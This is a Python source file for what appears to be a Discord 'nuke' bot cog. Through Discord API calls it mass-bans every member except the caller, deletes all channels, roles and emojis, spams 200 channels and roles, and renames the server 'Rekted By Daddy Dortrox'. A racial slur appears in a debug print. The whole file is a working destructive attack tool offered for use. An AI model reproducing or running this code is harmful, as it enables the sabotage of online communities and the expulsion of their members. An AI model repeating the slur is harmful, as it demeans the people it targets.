import discord, asyncio, time, json
from aiohttp import *
from discord.ext import commands as dortrox
global ban
fObj = open('config.json',)
ogdata = json.load(fObj)
token = ogdata['token']
ban = ogdata['ban']
uagent = ogdata['uagent']
channel_json = ogdata['channel_json']
role_json = ogdata['role_json']
headers = {'User-Agent': uagent, 'Authorization': token }


#The nuke beginning: 

async def cd(channel):
    async with ClientSession(headers=headers) as cs:#add proxy=proxy_url next in cs
        async with cs.delete(f'https://discord.com/api/v8/channels/{channel}') as r:
            if r.status == 200 or r.status == 201 or r.status == 204:
                print(f'Deleted Channel {channel}')
                global i
                i+=1
                print(i)
            elif r.status == 429:
                print("nigg")
                await time.sleep(3)
            else:
                print(f'{r.status}')

async def cs(ctx):
    guild = ctx.guild.id
    async with ClientSession(headers=headers) as cs:
        async with cs.post(f'https://discord.com/api/v8/guilds/{guild}/channels', json=channel_json) as r:
            if r.status == 200 or r.status == 201 or r.status == 204:
                global i
                i+=1
                print(i)
                print(f'Channel Spammed')
            elif r.status == 429:
                print("efew")
                await time.sleep(3)
            else:
                print(f'{r.status} Too many request/Not found')

async def ed(ctx, emoji):
    guild = ctx.guild.id
    async with ClientSession(headers=headers) as cs:
        async with cs.delete(f'https://discord.com/api/v8/guilds/{guild}/emojis/{emoji}') as r:
            if r.status == 200 or r.status == 201 or r.status == 204:
                print(f'Deleted Emoji {emoji}')
            else:
                print(f'{r.status} Too many request/Not found')

async def rd(ctx, role):
    guild = ctx.guild.id
    async with ClientSession(headers=headers) as cs:
        async with cs.delete(f'https://discord.com/api/v8/guilds/{guild}/roles/{role}') as r:
            if r.status == 200 or r.status == 201 or r.status == 204:
                print(f'Deleted role {role}')
            else:
                print(f'{r.status} Too many request/Not found')

async def rs(ctx):
    guild = ctx.guild.id
    async with ClientSession(headers=headers) as cs:
        async with cs.post(f'https://discord.com/api/v9/guilds/{guild}/roles', json=role_json) as r:
            if r.status == 200 or r.status == 201 or r.status == 204:
                print(f'Spammed role')
            else:
                print(f'{r.status} Too many request/Not found')

async def b(ctx, member):
    guild = ctx.guild.id
    async with ClientSession(headers=headers) as cs:
        async with cs.put(f'https://discord.com/api/v8/guilds/{guild}/bans/{member}', headers=headers) as r:
            if r.status == 200 or r.status == 201 or r.status == 204:
                print(f'Banned {member}')
            else:
                print(f'{r.status} Too many request/Not found')

#The nuke end

class nuke(dortrox.Cog):
    def __init__(self, dortrox):
        self.dortrox = dortrox


    @dortrox.command()
    async def nuke(self, ctx):
        try:
            await ctx.message.delete()
        except Exception as e:
            print(e)

        fObj = open('config.json',)
        ogdata = json.load(fObj)
        ban = ogdata['ban']
        try:
            ctx.message.delete
        except:
            await ctx.message.channel.send(f"""```py\n{e}```""")

        
        if ban == 'True':
            guilded = await ctx.guild.chunk()
            members = []
            for member in guilded:
                members.append(member.id)
            members.remove(ctx.author.id)
            await asyncio.gather(*[b(ctx, member) for member in members])

        with open('guild.jpg', 'rb') as f:
            icon = f.read()
            try:
                await ctx.guild.edit(icon=icon)
            except:
                pass
        await ctx.guild.edit(name="Rekted By Daddy Dortrox")
        await asyncio.gather(*[cd(channel.id) for channel in ctx.guild.channels])
        time.sleep(2)
        await asyncio.gather(*[cs(ctx) for _ in range(200)])
        await asyncio.gather(*[rd(ctx, role.id) for role in ctx.guild.roles])
        await asyncio.gather(*[rs(ctx) for _ in range(200)])
        await asyncio.gather(*[ed(ctx, emoji.id) for emoji in ctx.guild.emojis])

    @dortrox.command()
    async def delcha(self, ctx):
        await asyncio.gather(*[cd(channel.id) for channel in ctx.guild.channels])
    
    @dortrox.command()
    async def spamc(self, ctx):
        await asyncio.gather(*[cs(ctx) for _ in range(200)])

def setup(dortrox):
    dortrox.add_cog(nuke(dortrox))
